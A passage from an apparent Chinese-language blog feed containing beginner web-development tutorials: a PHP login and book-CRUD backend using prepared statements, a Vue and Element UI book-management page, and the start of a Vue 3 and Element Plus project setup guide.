这里应使用哈希密码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT id, username, balance FROM users WHERE username = ? AND password = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_stmt_get_result</span>(<span class="variable">$stmt</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="variable">$status</span> = <span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> ? <span class="string">&#x27;zhuye&#x27;</span> : <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="variable">$status</span>, <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;用户名或密码错误&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_close</span>(<span class="variable">$stmt</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="读取数据库-增删改查"><a href="#读取数据库-增删改查" class="headerlink" title="读取数据库-增删改查"></a>读取数据库-增删改查</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./index.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./vue.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">     &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">        &lt;el-button @click=<span class="string">&quot;openDialog(&#x27;add&#x27;, &#123;&#125;)&quot;</span>&gt;增加书籍&lt;/el-button&gt;</span><br><span class="line">        &lt;el-dialog :title=<span class="string">&quot;dialogTitle&quot;</span> :visible.sync=<span class="string">&quot;dialogVisible&quot;</span>&gt;</span><br><span class="line">            &lt;el-form :model=<span class="string">&quot;form&quot;</span>&gt;</span><br><span class="line">                &lt;el-form-item label=<span class="string">&quot;书名&quot;</span>&gt;</span><br><span class="line">                    &lt;el-input v-model=<span class="string">&quot;form.shuming&quot;</span>&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;/el-form-item&gt;</span><br><span class="line">                &lt;el-form-item label=<span class="string">&quot;作者&quot;</span>&gt;</span><br><span class="line">                    &lt;el-input v-model=<span class="string">&quot;form.zuozhe&quot;</span>&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;/el-form-item&gt;</span><br><span class="line">                &lt;el-form-item label=<span class="string">&quot;时间&quot;</span>&gt;</span><br><span class="line">                    &lt;el-input v-model=<span class="string">&quot;form.time&quot;</span>&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;/el-form-item&gt;</span><br><span class="line">            &lt;/el-form&gt;</span><br><span class="line">            &lt;span slot=<span class="string">&quot;footer&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">dialog</span>-<span class="title">footer</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">el</span>-<span class="title">button</span> @<span class="title">click</span>=&quot;<span class="title">dialogVisible</span> = <span class="title">false</span>&quot;&gt;取消&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">el</span>-<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">primary</span>&quot; @<span class="title">click</span>=&quot;<span class="title">submitForm</span>&quot;&gt;确认&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">el</span>-<span class="title">dialog</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;<span class="title">el</span>-<span class="title">table</span> :<span class="title">data</span>=&quot;<span class="title">tableData</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>: 100%&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span> <span class="title">prop</span>=&quot;<span class="title">id</span>&quot; <span class="title">label</span>=&quot;<span class="title">ID</span>&quot; <span class="title">width</span>=&quot;180&quot;&gt;&lt;/<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span> <span class="title">prop</span>=&quot;<span class="title">shuming</span>&quot; <span class="title">label</span>=&quot;书名&quot; <span class="title">width</span>=&quot;180&quot;&gt;&lt;/<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span> <span class="title">prop</span>=&quot;<span class="title">zuozhe</span>&quot; <span class="title">label</span>=&quot;作者&quot;&gt;&lt;/<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span> <span class="title">prop</span>=&quot;<span class="title">time</span>&quot; <span class="title">label</span>=&quot;时间&quot;&gt;&lt;/<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span> <span class="title">label</span>=&quot;操作&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">template</span> <span class="title">slot</span>-<span class="title">scope</span>=&quot;<span class="title">scope</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">el</span>-<span class="title">button</span> <span class="title">size</span>=&quot;<span class="title">mini</span>&quot; @<span class="title">click</span>=&quot;<span class="title">openDialog</span>(&#x27;<span class="title">edit</span>&#x27;, <span class="title">scope</span>.<span class="title">row</span>)&quot;&gt;编辑&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">el</span>-<span class="title">button</span> <span class="title">size</span>=&quot;<span class="title">mini</span>&quot; <span class="title">type</span>=&quot;<span class="title">danger</span>&quot; @<span class="title">click</span>=&quot;<span class="title">handleDelete</span>(<span class="title">scope</span>.<span class="title">row</span>)&quot;&gt;删除&lt;/<span class="title">el</span>-<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">template</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">el</span>-<span class="title">table</span>-<span class="title">column</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">el</span>-<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">new</span> <span class="title">Vue</span>(</span>&#123;</span><br><span class="line">            el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">            <span class="title function_ invoke__">data</span>() &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    tableData: [],</span><br><span class="line">                    dialogVisible: <span class="literal">false</span>,</span><br><span class="line">                    dialogTitle: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                    form: &#123;</span><br><span class="line">                        id: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        shuming: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        zuozhe: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                        time: <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                <span class="title function_ invoke__">fetchData</span>() &#123;</span><br><span class="line">                    axios.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://localhost/link.php&#x27;</span>)</span><br><span class="line">                        .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">                            this.tableData = response.data;</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">                            console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;加载数据时出错：&#x27;</span>, error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_ invoke__">openDialog</span>(action, book) &#123;</span><br><span class="line">                    this.dialogTitle = action === <span class="string">&#x27;add&#x27;</span> ? <span class="string">&#x27;增加书籍&#x27;</span> : <span class="string">&#x27;编辑书籍&#x27;</span>;</span><br><span class="line">                    this.form = action === <span class="string">&#x27;add&#x27;</span> ? &#123; shuming: <span class="string">&#x27;&#x27;</span>, zuozhe: <span class="string">&#x27;&#x27;</span>, time: <span class="string">&#x27;&#x27;</span> &#125; : Object.<span class="title function_ invoke__">assign</span>(&#123;&#125;, book);</span><br><span class="line">                    this.form.action = action; <span class="comment">// 设置 action</span></span><br><span class="line">                    this.dialogVisible = <span class="literal">true</span>;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_ invoke__">submitForm</span>() &#123;</span><br><span class="line">                    axios.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://localhost/book_action.php&#x27;</span>, this.form)</span><br><span class="line">                        .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">                            this.dialogVisible = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">if</span> (response.data.status === <span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">                                this.<span class="title function_ invoke__">fetchData</span>();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;操作失败: &#x27;</span> + response.data.message);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">                            console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;操作出错：&#x27;</span>, error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_ invoke__">handleDelete</span>(book) &#123;</span><br><span class="line">                    axios.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://localhost/book_action.php&#x27;</span>, &#123; <span class="attr">id</span>: book.id, <span class="attr">action</span>: <span class="string">&#x27;delete&#x27;</span> &#125;)</span><br><span class="line">                        .<span class="title function_ invoke__">then</span>(response =&gt; &#123;</span><br><span class="line">                            <span class="keyword">if</span> (response.data.status === <span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">                                this.tableData = this.tableData.<span class="title function_ invoke__">filter</span>(b =&gt; b.id !== book.id);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;删除失败: &#x27;</span> + response.data.message);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .<span class="keyword">catch</span>(error =&gt; &#123;</span><br><span class="line">                            console.<span class="title function_ invoke__">error</span>(<span class="string">&#x27;删除出错: &#x27;</span>, error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_ invoke__">mounted</span>() &#123;</span><br><span class="line">                this.<span class="title function_ invoke__">fetchData</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json;charset=UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$link</span>, <span class="string">&quot;utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$input</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$link</span>, <span class="string">&quot;INSERT INTO book (shuming, zuozhe, time) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;sss&#x27;</span>, <span class="variable">$input</span>[<span class="string">&#x27;shuming&#x27;</span>], <span class="variable">$input</span>[<span class="string">&#x27;zuozhe&#x27;</span>], <span class="variable">$input</span>[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line">        <span class="variable">$success</span> = <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$link</span>); <span class="comment">// 获取新增记录的 ID</span></span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_close</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;edit&#x27;</span>:</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$link</span>, <span class="string">&quot;UPDATE book SET shuming = ?, zuozhe = ?, time = ? WHERE id = ?&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;sssi&#x27;</span>, <span class="variable">$input</span>[<span class="string">&#x27;shuming&#x27;</span>], <span class="variable">$input</span>[<span class="string">&#x27;zuozhe&#x27;</span>], <span class="variable">$input</span>[<span class="string">&#x27;time&#x27;</span>], <span class="variable">$input</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="variable">$success</span> = <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_close</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$link</span>, <span class="string">&quot;DELETE FROM book WHERE id = ?&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&#x27;i&#x27;</span>, <span class="variable">$input</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="variable">$success</span> = <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_stmt_close</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="variable">$success</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = [<span class="string">&#x27;status&#x27;</span> =&gt; <span class="variable">$success</span> ? <span class="string">&#x27;success&#x27;</span> : <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="variable">$success</span> ? <span class="string">&#x27;操作成功&#x27;</span> : <span class="string">&#x27;操作失败&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$success</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="variable">$response</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>; <span class="comment">// 如果是添加操作，返回新增记录的 ID</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vue-数据绑定与交互&quot;&gt;&lt;a href=&quot;#Vue-数据绑定与交互&quot; class=&quot;headerlink&quot; title=&quot;Vue 数据绑定与交互&quot;&gt;&lt;/a&gt;Vue 数据绑定与交互&lt;/h1&gt;&lt;h2 id=&quot;1-Vue-js-基础&quot;&gt;&lt;a href=&quot;#1-Vue-</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>vue的基础配置</title>
    <link href="http://example.com/2023/12/17/vue3%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2023/12/17/vue3%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</id>
    <published>2023-12-17T01:07:54.375Z</published>
    <updated>2023-12-17T01:52:10.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue3基础配置"><a href="#vue3基础配置" class="headerlink" title="vue3基础配置"></a>vue3基础配置</h1><h3 id="创建一个空白文件夹，并且用VScode打开这个空白文件夹。打开终端输入以下指令："><a href="#创建一个空白文件夹，并且用VScode打开这个空白文件夹。打开终端输入以下指令：" class="headerlink" title="创建一个空白文件夹，并且用VScode打开这个空白文件夹。打开终端输入以下指令："></a><strong>创建一个空白文件夹</strong>，并且用VScode打开这个空白文件夹。打开终端输入以下指令：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm create vue@latest</span><br></pre></td></tr></table></figure><h3 id="输入项目名称后一直点击回车即可。"><a href="#输入项目名称后一直点击回车即可。" class="headerlink" title="输入项目名称后一直点击回车即可。"></a><strong>输入项目名称后一直点击回车即可</strong>。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211162545838.png" alt="image-20231211162545838"></p><h3 id="建立项目完成后，依次输入以下指令："><a href="#建立项目完成后，依次输入以下指令：" class="headerlink" title="建立项目完成后，依次输入以下指令："></a>建立项目完成后，<strong>依次输入以下指令</strong>：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vue-project</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211162707138.png" alt="image-20231211162707138"></p><h3 id="最后会得到链接打开查看如图所示即为创建项目成功："><a href="#最后会得到链接打开查看如图所示即为创建项目成功：" class="headerlink" title="最后会得到链接打开查看如图所示即为创建项目成功："></a>最后会得到链接打开查看如图所示即为创建项目成功：</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211162925144.png" alt="image-20231211162925144"></p><h3 id="找到“vite-config-js”文件，将文件内容更改为"><a href="#找到“vite-config-js”文件，将文件内容更改为" class="headerlink" title="找到“vite.config.js”文件，将文件内容更改为"></a>找到“vite.config.js”文件，将文件内容更改为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;</span><br><span class="line"></span><br><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import AutoImport from &#x27;unplugin-auto-import/vite&#x27;</span><br><span class="line">import Components from &#x27;unplugin-vue-components/vite&#x27;</span><br><span class="line">import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;</span><br><span class="line"></span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">    // ...</span><br><span class="line">    AutoImport(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211100321449.png" alt="image-20231211100321449"></p><h3 id="找到“vmain-js”文件，将文件内容更改为："><a href="#找到“vmain-js”文件，将文件内容更改为：" class="headerlink" title="找到“vmain.js”文件，将文件内容更改为："></a>找到“vmain.js”文件，将文件内容更改为：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">import ElementPlus from &#x27;element-plus&#x27;;</span><br><span class="line">import &#x27;element-plus/dist/index.css&#x27;</span><br><span class="line"></span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211092931467.png" alt="image-20231211092931467"></p><h3 id="随后输入以下指令-完善最后配置"><a href="#随后输入以下指令-完善最后配置" class="headerlink" title="随后输入以下指令,完善最后配置"></a>随后输入以下指令,完善最后配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install element-plus --save</span><br><span class="line">npm install -D unplugin-vue-components unplugin-auto-import</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211094310119.png" alt="image-20231211094310119"></p><h1 id="Vue3搭建网页"><a href="#Vue3搭建网页" class="headerlink" title="Vue3搭建网页"></a>Vue3搭建网页</h1><h3 id="所需要搭建界面目标如下图所示"><a href="#所需要搭建界面目标如下图所示" class="headerlink" title="所需要搭建界面目标如下图所示"></a>所需要搭建界面目标如下图所示</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211194056587.png" alt="image-20231211194056587"></p><h3 id="布局设计"><a href="#布局设计" class="headerlink" title="布局设计"></a>布局设计</h3><p>在vue官网中寻找相似“Container 布局容器”作为基础布局，基础布局如下：</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231211194441988.png" 